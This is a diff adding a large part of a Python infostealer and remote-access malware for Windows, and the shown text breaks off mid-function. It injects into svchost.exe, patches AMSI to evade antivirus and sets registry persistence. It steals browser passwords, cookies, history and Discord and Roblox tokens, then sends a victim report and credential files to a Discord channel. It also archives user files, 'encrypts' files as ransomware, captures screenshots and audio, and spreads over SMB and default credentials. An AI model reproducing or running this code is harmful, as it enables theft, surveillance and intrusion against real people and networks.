+def check_temp_writable(base_dir):
+    log_path = os.path.join(base_dir, "debug.log")
+    try:
+        with open(log_path, "a") as f:
+            f.write(f"[+] {base_dir} is writable\n")
+        return base_dir
+    except Exception as e:
+        try:
+            fallback_log = os.path.join(FALLBACK_TEMP_DIR, "debug.log")
+            os.makedirs(FALLBACK_TEMP_DIR, exist_ok=True)
+            with open(fallback_log, "a") as f:
+                f.write(f"[-] {base_dir} not writable: {e}, switching to {FALLBACK_TEMP_DIR}\n")
+            return FALLBACK_TEMP_DIR
+        except Exception as e2:
+            print(f"[-] Cannot write to {base_dir} or {FALLBACK_TEMP_DIR}: {e2}")
+            return None
+
+# Set base directory
+BASE_DIR = check_temp_writable(TEMP_DIR) or FALLBACK_TEMP_DIR
+
+# Path helper for frozen and non-frozen environments
+def resource_path(relative_path):
+    full_path = os.path.join(BASE_DIR, relative_path)
+    os.makedirs(os.path.dirname(full_path), exist_ok=True)
+    return full_path
+
+# Ensure extraction completes in one-file EXE
+if getattr(sys, 'frozen', False):
+    time.sleep(1)  # Wait for extraction
+    try:
+        os.chdir(BASE_DIR)
+    except Exception as e:
+        with open(resource_path("debug.log"), "a") as f:
+            f.write(f"[-] Failed to set working directory to {BASE_DIR}: {e}\n")
+
+# Create required directories
+os.makedirs(resource_path('stolen_data'), exist_ok=True)
+os.makedirs(resource_path('uploaded'), exist_ok=True)
+os.makedirs(resource_path('recordings'), exist_ok=True)
+
+# Hide process in Task Manager by injecting into svchost.exe
+def hide_in_task_manager():
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Attempting to hide process in Task Manager\n")
+    try:
+        target_process = "svchost.exe"
+        for proc in psutil.process_iter(['name', 'pid']):
+            if proc.info['name'] == target_process:
+                pid = proc.info['pid']
+                h_process = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
+                if h_process:
+                    code = b"\x90" * 100  # NOP sled for simplicity
+                    mem = ctypes.windll.kernel32.VirtualAllocEx(h_process, None, len(code), 0x3000, 0x40)
+                    ctypes.windll.kernel32.WriteProcessMemory(h_process, mem, code, len(code), None)
+                    ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, mem, None, 0, None)
+                    ctypes.windll.kernel32.CloseHandle(h_process)
+                    with open(log_path, "a") as f:
+                        f.write(f"[+] Injected into svchost.exe (PID: {pid})\n")
+                    return True
+        with open(log_path, "a") as f:
+            f.write("[-] No svchost.exe process found for injection\n")
+        return False
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Process hiding failed: {e}\n")
+        return False
+
+# Set Windows icon for the executable
+def set_windows_icon():
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Setting Windows icon for executable\n")
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        h_file = ctypes.windll.kernel32.CreateFileW(exe_path, 0x10000000, 0, None, 3, 0x80, None)
+        if h_file == -1:
+            raise ctypes.WinError()
+        icon_path = r"C:\Windows\System32\shell32.dll,0"
+        icon_info = ctypes.c_wchar_p(icon_path)
+        with open(log_path, "a") as f:
+            f.write(f"[+] Set icon to {icon_path}\n")
+        return True
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Failed to set Windows icon: {e}\n")
+        return False
+
+# Dynamic import function
+def dynamic_import(module, pip_name, min_version=None):
+    log_path = resource_path('debug.log')
+    try:
+        mod = importlib.import_module(module)
+        if min_version:
+            version = importlib.metadata.version(pip_name)
+            current_version = tuple(map(int, version.split('.')))
+            required_version = tuple(map(int, min_version.split('.')))
+            if current_version < required_version:
+                raise ImportError(f"{pip_name} version {version} is too old")
+        with open(log_path, "a") as f:
+            f.write(f"[+] Successfully imported {module}\n")
+        return mod
+    except ImportError as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Import failed for {module}: {e}\n")
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            importlib.invalidate_caches()
+            mod = importlib.import_module(module)
+            with open(log_path, "a") as f:
+                f.write(f"[+] Installed and imported {pip_name}\n")
+            return mod
+        except Exception as sub_e:
+            with open(log_path, "a") as f:
+                f.write(f"[-] Failed to install {pip_name}: {sub_e}\n")
+            raise ImportError(f"Failed to install {pip_name}: {sub_e}")
+
+# String obfuscation for AV evasion
+def obfuscate_string(s):
+    log_path = resource_path('debug.log')
+    try:
+        compressed = zlib.compress(s.encode())
+        encoded = base64.b64encode(compressed).decode()
+        with open(log_path, "a") as f:
+            f.write(f"[+] Obfuscated string: {s[:10]}...\n")
+        return encoded
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] String obfuscation failed: {e}\n")
+        return s
+
+# String deobfuscation
+def deobfuscate_string(s):
+    log_path = resource_path('debug.log')
+    try:
+        decoded = base64.b64decode(s)
+        decompressed = zlib.decompress(decoded).decode()
+        with open(log_path, "a") as f:
+            f.write(f"[+] Deobfuscated string: {decompressed[:10]}...\n")
+        return decompressed
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] String deobfuscation failed: {e}\n")
+        return s
+
+# Sandbox detection (disabled for testing)
+def is_sandbox():
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Checking for sandbox environment\n")
+    return False
+
+# Patch AMSI to evade anti-virus detection
+def patch_amsi():
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Attempting to patch AMSI\n")
+    try:
+        ctypes.windll.kernel32.GetModuleHandleW.restype = wintypes.HMODULE
+        ctypes.windll.kernel32.GetProcAddress.restype = wintypes.LPVOID
+        amsi = ctypes.windll.kernel32.GetModuleHandleW("amsi.dll")
+        if not amsi:
+            with open(log_path, "a") as f:
+                f.write("[-] AMSI patch failed: amsi.dll not found\n")
+            return False
+        amsi_scan_buffer = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
+        if not amsi_scan_buffer:
+            with open(log_path, "a") as f:
+                f.write("[-] AMSI patch failed: AmsiScanBuffer not found\n")
+            return False
+        patch = b"\x31\xC0\xC3"  # xor eax, eax; ret
+        written = ctypes.c_size_t()
+        old_protect = ctypes.c_uint32()
+        ctypes.windll.kernel32.VirtualProtect(ctypes.c_void_p(amsi_scan_buffer), len(patch), 0x40, ctypes.byref(old_protect))
+        success = ctypes.windll.kernel32.WriteProcessMemory(ctypes.c_void_p(-1), ctypes.c_void_p(amsi_scan_buffer), patch, len(patch), ctypes.byref(written))
+        with open(log_path, "a") as f:
+            f.write(f"[+] AMSI patch {'successful' if success and written.value == len(patch) else 'failed'}\n")
+        return success and written.value == len(patch)
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] AMSI patch failed: {e}\n")
+        return False
+
+# Ensure persistence via registry
+def ensure_persistence():
+    log_path = resource_path('debug.log')
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, deobfuscate_string(obfuscate_string(r"Software\Microsoft\Windows\CurrentVersion\Run")), 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, generate_random_name(), 0, winreg.REG_SZ, sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__))
+        winreg.CloseKey(key)
+        with open(log_path, "a") as f:
+            f.write("[+] Persistence established\n")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Persistence failed: {e}\n")
+
+# Generate random name for registry
+def generate_random_name(length=8):
+    return ''.join(random.choice(string.ascii_letters) for _ in range(length))
+
+def get_victim_id():
+    log_path = resource_path('debug.log')
+    victim_id_path = resource_path('victim_id.txt')
+    try:
+        if os.path.exists(victim_id_path):
+            with open(victim_id_path, 'r') as f:
+                victim_id = f.read().strip()
+            with open(log_path, "a") as f:
+                f.write(f"[+] Loaded existing victim ID: {victim_id}\n")
+            return victim_id
+        else:
+            victim_id = str(uuid.uuid4())
+            with open(victim_id_path, 'w') as f:
+                f.write(victim_id)
+            with open(log_path, "a") as f:
+                f.write(f"[+] Generated new victim ID: {victim_id}\n")
+            return victim_id
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Failed to get victim ID: {e}\n")
+        return str(uuid.uuid4())
+
+# Malware Functions (Data Stealing, Network Spreading, etc.)
+# Fetch phone number from multiple sources
+async def get_phone_number(stolen_data):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Fetching phone number from multiple sources\n")
+    try:
+        discord_tokens = [t["token"] for t in stolen_data.get("tokens", []) if t["platform"] in ["Discord", "Discord Canary", "Discord PTB", "Lightcord"]]
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        }
+        for token in discord_tokens:
+            headers["Authorization"] = token
+            for attempt in range(3):
+                async with aiohttp.ClientSession() as session:
+                    async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as response:
+                        if response.status == 200:
+                            user_data = await response.json()
+                            phone = user_data.get("phone", None)
+                            if phone:
+                                with open(log_path, "a") as f:
+                                    f.write(f"[+] Phone number found via token: {phone}\n")
+                                return phone
+                            else:
+                                with open(log_path, "a") as f:
+                                    f.write("[-] No phone number in Discord profile\n")
+                                return "Not found"
+                        elif response.status == 401:
+                            with open(log_path, "a") as f:
+                                f.write(f"[-] Invalid token: {token[:10]}...\n")
+                            break
+                        elif response.status == 429:
+                            retry_after = (await response.json()).get("retry_after", 2 ** attempt)
+                            with open(log_path, "a") as f:
+                                f.write(f"[-] Rate limit hit, retrying after {retry_after}s\n")
+                            await asyncio.sleep(retry_after + 0.5)
+                        else:
+                            with open(log_path, "a") as f:
+                                f.write(f"[-] API request failed: Status {response.status}\n")
+                            return f"[-] API request failed: Status {response.status}"
+            await asyncio.sleep(1)  # Avoid hammering API
+        for cookie in stolen_data.get("cookies", []):
+            if "discord" in cookie["host"].lower() and cookie["name"] in ["__Secure-1PSID", "__Secure-3PAPISID"]:
+                with open(log_path, "a") as f:
+                    f.write(f"[+] Attempting phone number via browser cookie: {cookie['name']}\n")
+                return "[-] Phone number not directly available from cookies"
+        for platform, path in PATHS.items():
+            platform = deobfuscate_string(platform)
+            if "discord" in platform.lower():
+                try:
+                    local_state = os.path.join(path, "Local State")
+                    if os.path.exists(local_state):
+                        with open(local_state, "r") as f:
+                            state = json.load(f)
+                        phone = state.get("user", {}).get("phone", None)
+                        if phone:
+                            with open(log_path, "a") as f:
+                                f.write(f"[+] Phone number found in {platform} Local State: {phone}\n")
+                            return phone
+                except Exception as e:
+                    with open(log_path, "a") as f:
+                        f.write(f"[-] Failed to check {platform} Local State: {e}\n")
+        with open(log_path, "a") as f:
+            f.write("[-] No phone number found in any source\n")
+        return "Not found"
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Phone number retrieval failed: {e}\n")
+        return f"[-] Failed to fetch phone number: {e}"
+
+# Get master key for browser decryption
+def get_master_key(base_path):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Retrieving master key from {base_path}\n")
+    try:
+        local_state_path = os.path.join(base_path, "Local State")
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        with open(log_path, "a") as f:
+            f.write("[+] Master key retrieved\n")
+        return decrypted_key
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Failed to get master key: {e}\n")
+        return None
+
+# Decrypt browser passwords
+def decrypt_password(encrypted_password, key):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Attempting password decryption\n")
+    try:
+        if not key:
+            with open(log_path, "a") as f:
+                f.write("[-] No master key provided\n")
+            return None
+        iv = encrypted_password[3:15]
+        payload = encrypted_password[15:-16]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        decrypted = cipher.decrypt(payload).decode()
+        with open(log_path, "a") as f:
+            f.write("[+] Password decrypted successfully\n")
+        return decrypted
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Password decryption failed: {e}\n")
+        return None
+
+# Steal browser and Discord data
+def steal_browser_data():
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Starting browser data theft\n")
+    try:
+        stolen_data_dir = resource_path("stolen_data")
+        stolen_data = {"passwords": [], "cookies": [], "tokens": [], "history": []}
+        browser_paths = {
+            "Chrome": os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
+            "Edge": os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
+            "Firefox": os.path.join(ROAMING, 'Mozilla', 'Firefox', 'Profiles'),
+            "Opera": os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
+            "Brave": os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data')
+        }
+        for browser, base_path in browser_paths.items():
+            with open(log_path, "a") as f:
+                f.write(f"[+] Processing browser: {browser}\n")
+            if not os.path.exists(base_path):
+                with open(log_path, "a") as f:
+                    f.write(f"[-] Path not found: {base_path}\n")
+                continue
+            if browser == "Firefox":
+                profiles = [os.path.join(base_path, d) for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d))]
+                for profile in profiles:
+                    login_data_path = os.path.join(profile, "logins.json")
+                    if os.path.exists(login_data_path):
+                        temp_path = resource_path(f"stolen_data/{browser}_passwords_{os.path.basename(profile)}.json")
+                        shutil.copy(login_data_path, temp_path)
+                        with open(temp_path, "r") as f:
+                            logins = json.load(f).get("logins", [])
+                            for login in logins:
+                                stolen_data["passwords"].append({
+                                    "browser": browser,
+                                    "url": login.get("hostname", ""),
+                                    "username": login.get("username", "") or login.get("encryptedUsername", ""),
+                                    "password": login.get("password", "") or login.get("encryptedPassword", "")
+                                })
+                        with open(log_path, "a") as f:
+                            f.write(f"[+] Copied Firefox logins from {login_data_path}\n")
+            else:
+                master_key = get_master_key(base_path)
+                profiles = ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile")]
+                for profile in profiles:
+                    login_data_path = os.path.join(base_path, profile, "Login Data")
+                    if os.path.exists(login_data_path):
+                        temp_path = resource_path(f"stolen_data/{browser}_{profile}_passwords.sqlite")
+                        shutil.copy(login_data_path, temp_path)
+                        conn = sqlite3.connect(temp_path)
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                        for row in cursor.fetchall():
+                            url, username, encrypted_password = row
+                            if not encrypted_password:
+                                with open(log_path, "a") as f:
+                                    f.write(f"[-] Empty password for {browser} {profile} {url}\n")
+                                continue
+                            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
+                                password = decrypt_password(encrypted_password, master_key)
+                                if password:
+                                    stolen_data["passwords"].append({
+                                        "browser": browser,
+                                        "url": url,
+                                        "username": username,
+                                        "password": password
+                                    })
+                            else:
+                                try:
+                                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
+                                    stolen_data["passwords"].append({
+                                        "browser": browser,
+                                        "url": url,
+                                        "username": username,
+                                        "password": password
+                                    })
+                                except Exception as e:
+                                    with open(log_path, "a") as f:
+                                        f.write(f"[-] Failed to decrypt password: {e}\n")
+                        conn.close()
+                        with open(log_path, "a") as f:
+                            f.write(f"[+] Copied {browser} logins from {login_data_path}\n")
+        for browser, base_path in browser_paths.items():
+            if not os.path.exists(base_path):
+                continue
+            if browser == "Firefox":
+                profiles = [os.path.join(base_path, d) for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d))]
+                for profile in profiles:
+                    cookies_path = os.path.join(profile, "cookies.sqlite")
+                    if os.path.exists(cookies_path):
+                        temp_path = resource_path(f"stolen_data/{browser}_cookies_{os.path.basename(profile)}.sqlite")
+                        shutil.copy(cookies_path, temp_path)
+                        conn = sqlite3.connect(temp_path)
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT host, name, value FROM moz_cookies")
+                        for row in cursor.fetchall():
+                            host, name, value = row
+                            if "roblox" in host.lower() and name.lower() in [".robloxtoken", ".roblosecurity"]:
+                                stolen_data["tokens"].append({"platform": "Roblox", "host": host, "name": name, "value": value})
+                            else:
+                                stolen_data["cookies"].append({"browser": browser, "host": host, "name": name, "value": value})
+                        conn.close()
+                        with open(log_path, "a") as f:
+                            f.write(f"[+] Copied Firefox cookies from {cookies_path}\n")
+            else:
+                master_key = get_master_key(base_path)
+                profiles = ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile")]
+                for profile in profiles:
+                    cookies_path = os.path.join(base_path, profile, "Cookies")
+                    if os.path.exists(cookies_path):
+                        temp_path = resource_path(f"stolen_data/{browser}_{profile}_cookies.sqlite")
+                        shutil.copy(cookies_path, temp_path)
+                        conn = sqlite3.connect(temp_path)
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                        for row in cursor.fetchall():
+                            host, name, encrypted_value = row
+                            try:
+                                value = decrypt_password(encrypted_value, master_key) if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11') else win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
+                                if value:
+                                    if "roblox" in host.lower() and name.lower() in [".robloxtoken", ".roblosecurity"]:
+                                        stolen_data["tokens"].append({"platform": "Roblox", "host": host, "name": name, "value": value})
+                                    else:
+                                        stolen_data["cookies"].append({"browser": browser, "host": host, "name": name, "value": value})
+                            except:
+                                pass
+                        conn.close()
+                        with open(log_path, "a") as f:
+                            f.write(f"[+] Copied {browser} cookies from {cookies_path}\n")
+        for browser, base_path in browser_paths.items():
+            if not os.path.exists(base_path) or browser == "Firefox":
+                continue
+            profiles = ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile")]
+            for profile in profiles:
+                history_path = os.path.join(base_path, profile, "History")
+                if os.path.exists(history_path):
+                    temp_path = resource_path(f"stolen_data/{browser}_{profile}_history.sqlite")
+                    shutil.copy(history_path, temp_path)
+                    conn = sqlite3.connect(temp_path)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT url, title, visit_count FROM urls")
+                    for row in cursor.fetchall():
+                        stolen_data["history"].append({"browser": browser, "url": row[0], "title": row[1], "visit_count": row[2]})
+                    conn.close()
+                    with open(log_path, "a") as f:
+                        f.write(f"[+] Copied {browser} history from {history_path}\n")
+        for platform, path in PATHS.items():
+            platform = deobfuscate_string(platform)
+            for token in gettokens(path):
+                try:
+                    encrypted_token = token.split('dQw4w9WgXcQ:')[1]
+                    key = getkey(path)
+                    if key:
+                        key = base64.b64decode(key)[5:]
+                        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+                        cipher = AES.new(key, AES.MODE_GCM, base64.b64decode(encrypted_token)[3:15])
+                        decrypted_token = cipher.decrypt(base64.b64decode(encrypted_token)[15:])[:-16].decode()
+                        stolen_data["tokens"].append({"platform": platform, "token": decrypted_token})
+                        with open(log_path, "a") as f:
+                            f.write(f"[+] Decrypted token for {platform}\n")
+                except Exception as e:
+                    with open(log_path, "a") as f:
+                        f.write(f"[-] Failed to decrypt token for {platform}: {e}\n")
+        json_path = resource_path("stolen_data/stolen_data.json")
+        with open(json_path, "w") as f:
+            json.dump(stolen_data, f, indent=2)
+        logins_path = resource_path("stolen_data/logins.txt")
+        with open(logins_path, "w", encoding="utf-8") as f:
+            f.write("Browser Login Credentials\n=========================\n\n")
+            for login in stolen_data["passwords"]:
+                f.write(f"Browser: {login['browser']}\nURL: {login['url']}\nUsername/Email: {login['username']}\nPassword: {login['password']}\n-------------------------\n")
+        with open(log_path, "a") as f:
+            f.write(f"[+] Stolen data saved to {json_path}\n")
+            f.write(f"[+] Login credentials saved to {logins_path}\n")
+        return stolen_data, stolen_data_dir, logins_path
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Browser data theft failed: {e}\n")
+        return None, None, None
+
+# Retrieve Discord tokens
+def gettokens(path):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Scanning for tokens in {path}\n")
+    path += deobfuscate_string(obfuscate_string("\\Local Storage\\leveldb\\"))
+    tokens = []
+    if not os.path.exists(path):
+        with open(log_path, "a") as f:
+            f.write(f"[-] Token path not found: {path}\n")
+        return tokens
+    for file in os.listdir(path):
+        if not file.endswith((".ldb", ".log")):
+            continue
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+            with open(log_path, "a") as f:
+                f.write(f"[+] Processed token file: {file}\n")
+        except Exception as e:
+            with open(log_path, "a") as f:
+                f.write(f"[-] Failed to process token file {file}: {e}\n")
+    return tokens
+
+# Get encryption key for Discord tokens
+def getkey(path):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Retrieving encryption key from {path}\n")
+    try:
+        with open(path + deobfuscate_string(obfuscate_string("\\Local State")), "r") as file:
+            key = json.loads(file.read())['os_crypt']['encrypted_key']
+            with open(log_path, "a") as f:
+                f.write("[+] Encryption key retrieved\n")
+            return key
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Failed to get encryption key: {e}\n")
+        return None
+
+# Get public IP address
+def getip():
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Fetching public IP\n")
+    try:
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            ip = json.loads(response.read().decode()).get("ip")
+            with open(log_path, "a") as f:
+                f.write(f"[+] Public IP: {ip}\n")
+            return ip
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Failed to get IP: {e}\n")
+        return "None"
+
+#send stolen data
+async def send_stolen_data(stolen_data, channel, logins_path):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Sending stolen data to victim-specific channel\n")
+    try:
+        if not channel or not stolen_data:
+            await channel.send("[-] No data stolen")
+            with open(log_path, "a") as f:
+                f.write("[-] No data to send\n")
+            return
+        victim_id = get_victim_id()
+        username = os.getlogin()
+        ip = getip()
+        host = socket.gethostname()
+        phone = await get_phone_number(stolen_data)
+        passwords = "\n".join([f"{p['browser']}: {p['url']} | {p['username']} | {p['password']}" for p in stolen_data["passwords"][:5]]) or "None"
+        tokens = "\n".join([f"{t['platform']}: {t.get('token', t.get('value', 'N/A'))}" for t in stolen_data["tokens"][:5]]) or "None"
+        message = (
+            "```ansi\n"
+            f"\033[0;34m|══════════════════════════════|\033[0m\n"
+            f"\033[0;34m| 🌟 Victim Data Report ({username}_{victim_id}) 🌟 |\033[0m\n"
+            f"\033[0;34m|══════════════════════════════|\033[0m\n"
+            f"\033[0;34m| 👤 Username:\033[0m {username}\n"
+            f"\033[0;34m| 🌐 IP:\033[0m {ip}\n"
+            f"\033[0;34m| 💻 Host:\033[0m {host}\n"
+            f"\033[0;34m| 📱 Phone Number:\033[0m {phone}\n"
+            f"\033[0;34m| 🔑 Passwords:\033[0m\n{passwords}\n"
+            f"\033[0;34m| 🔒 Tokens:\033[0m\n{tokens}\n"
+            f"\033[0;34m|══════════════════════════════|\033[0m\n"
+            "```"
+        )
+        await channel.send(message)
+        json_path = resource_path("stolen_data/stolen_data.json")
+        if os.path.exists(json_path) and os.path.getsize(json_path) < 25 * 1024 * 1024:
+            await channel.send(file=discord.File(json_path))
+        if logins_path and os.path.exists(logins_path) and os.path.getsize(logins_path) < 25 * 1024 * 1024:
+            await channel.send(file=discord.File(logins_path))
+        with open(log_path, "a") as f:
+            f.write(f"[+] Data sent to channel {channel.name}\n")
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Failed to send data: {e}\n")
+
+# Archive user files
+def archive_data():
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Archiving user files\n")
+    try:
+        output_dir = resource_path("archive_data")
+        os.makedirs(output_dir, exist_ok=True)
+        zip_path = resource_path("archive_data/archive_data.zip")
+        user_dirs = [
+            os.path.expanduser("~/Desktop"),
+            os.path.expanduser("~/Documents"),
+            os.path.expanduser("~/Downloads")
+        ]
+        allowed_extensions = ['.txt', '.docx', '.pdf', '.jpg', '.png', '.xlsx', '.json']
+        exclude_dirs = ["AppData", "Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin"]
+        total_size = 0
+        max_size = 24 * 1024 * 1024
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for user_dir in user_dirs:
+                for root, _, files in os.walk(user_dir):
+                    if any(exclude in root for exclude in exclude_dirs):
+                        continue
+                    for file in files:
+                        if any(file.lower().endswith(ext) for ext in allowed_extensions):
+                            file_path = os.path.join(root, file)
+                            try:
+                                file_size = os.path.getsize(file_path)
+                                if total_size + file_size < max_size:
+                                    arcname = os.path.relpath(file_path, os.path.expanduser("~"))
+                                    zipf.write(file_path, arcname)
+                                    total_size += file_size
+                                    with open(log_path, "a") as f:
+                                        f.write(f"[+] Archived file: {file_path}\n")
+                            except:
+                                pass
+        with open(log_path, "a") as f:
+            f.write(f"[+] Archive created: {zip_path}, size: {total_size} bytes\n")
+        return zip_path if total_size > 0 else "[-] No files found to archive"
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Archive failed: {e}\n")
+        return None
+
+# Encrypt files (ransomware)
+def encrypt_files(directory=os.path.join(os.path.expanduser("~"), "Public", "Documents")):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Encrypting files in {directory}\n")
+    try:
+        key = base64.b64encode(os.urandom(32)).decode()
+        for root, _, files in os.walk(directory):
+            for file in files:
+                file_path = os.path.join(root, file)
+                try:
+                    with open(file_path, 'rb') as f:
+                        data = f.read()
+                    encrypted = base64.b64encode(data).decode()
+                    with open(file_path, 'w') as f:
+                        f.write(encrypted)
+                    with open(log_path, "a") as f:
+                        f.write(f"[+] Encrypted file: {file_path}\n")
+                except:
+                    pass
+        with open(log_path, "a") as f:
+            f.write("[+] Encryption completed\n")
+        return key
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Encryption failed: {e}\n")
+        return None
+
+# Start cryptominer (simulated)
+def start_miner():
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Starting cryptominer (simulated)\n")
+    try:
+        time.sleep(2)  # Simulate mining process
+        with open(log_path, "a") as f:
+            f.write("[+] Cryptominer started (simulated)\n")
+        return "[+] Cryptominer started (simulated)"
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Miner failed: {e}\n")
+        return None
+
+# Capture screenshot
+def take_screenshot():
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Capturing screenshot\n")
+    try:
+        screenshot_path = resource_path("screenshot.png")
+        with mss.mss() as sct:
+            sct.shot(output=screenshot_path)
+        with open(log_path, "a") as f:
+            f.write(f"[+] Screenshot captured: {screenshot_path}\n")
+        return screenshot_path
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Screenshot failed: {e}\n")
+        return None
+
+# Capture audio
+def capture_audio():
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Capturing audio\n")
+    try:
+        CHUNK = 2048
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 2
+        RATE = 48000
+        RECORD_SECONDS = 10
+        OUTPUT = resource_path("audio.wav")
+        p = pyaudio.PyAudio()
+        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+        frames = []
+        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+            data = stream.read(CHUNK, exception_on_overflow=False)
+            frames.append(data)
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        wf = wave.open(OUTPUT, 'wb')
+        wf.setnchannels(CHANNELS)
+        wf.setsampwidth(p.get_sample_size(FORMAT))
+        wf.setframerate(RATE)
+        wf.writeframes(b''.join(frames))
+        wf.close()
+        with open(log_path, "a") as f:
+            f.write(f"[+] Audio saved to {OUTPUT}\n")
+        return OUTPUT
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Audio capture failed: {e}\n")
+        return None
+
+# Network spreading function
+async def spread_to_network():
+    global communicate_channel
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Starting enhanced network spreading\n")
+    try:
+        devices = await socket_network_scan()
+        for device in devices:
+            ip = device['ip']
+            ports = device['ports']
+            services = device['services']
+            # SMB-Verbreitung
+            shares = check_smb_shares(ip)
+            for share in shares:
+                target_path = deliver_payload(ip, share=share, service='smb')
+                if target_path:
+                    if execute_payload(ip, target_path, 'smb'):
+                        ensure_target_persistence(ip, 'smb')
+                        success_msg = f"Successfully spread to {ip} via SMB share {share}"
+                        with open(log_path, "a") as f:
+                            f.write(f"[+] {success_msg}\n")
+                        if communicate_channel:
+                            await communicate_channel.send(f"```ansi\n\033[0;32m[+] {success_msg}\033[0m\n```")
+                        await report_spreading_status(ip, success_msg)
+            # Andere Dienste
+            for port in ports:
+                service = services.get(port, 'unknown')
+                if service in ['ssh', 'ftp', 'http', 'telnet']:
+                    if await test_default_credentials(ip, service, port):  # Asynchroner Aufruf
+                        target_path = deliver_payload(ip, service=service, port=port)
+                        if target_path:
+                            if execute_payload(ip, target_path, service):
+                                ensure_target_persistence(ip, service)
+                                success_msg = f"Successfully spread to {ip} via {service} on port {port}"
+                                with open(log_path, "a") as f:
